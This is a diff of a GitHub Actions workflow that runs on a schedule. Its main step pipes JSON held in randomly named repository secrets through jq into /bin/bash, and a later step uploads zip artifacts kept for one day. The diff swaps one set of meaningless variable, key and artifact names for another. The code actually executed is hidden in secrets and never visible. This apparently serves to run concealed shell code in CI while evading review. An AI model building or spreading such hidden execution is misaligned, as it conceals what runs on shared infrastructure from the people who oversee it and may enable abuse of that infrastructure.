@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '57 1,7,13,19 * * *'
+    - cron: '0 2,8,14,20 * * *'
 env:
   CI: true
 jobs:
@@ -15,16 +15,16 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          gvlly04: ${{ secrets.gvlly04 }}
+          symlw4734: ${{ secrets.symlw4734 }}
         run: |
-          printf '%s' "$gvlly04" | jq -r .l438 | /bin/bash
-          printf '%s' "$yle444" | jq -r .uoz56 | /bin/bash
-          printf '%s' "$r332" | jq -r .wljl76 | /bin/bash
-          printf '%s' "$jao0445" | jq -r .nmrz7649 | /bin/bash
+          printf '%s' "$symlw4734" | jq -r .rtkz50 | /bin/bash
+          echo $fzh234 | jq -r .bkwt53572 | /bin/bash
+          echo $ctbd3845 | jq -r .eyhh0 | /bin/bash
+          echo $gmgbv03 | jq -r .ke158 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: 4SjGfdXW
+          name: 6CIGb8cP
           path: "*.zip"
           retention-days: 1
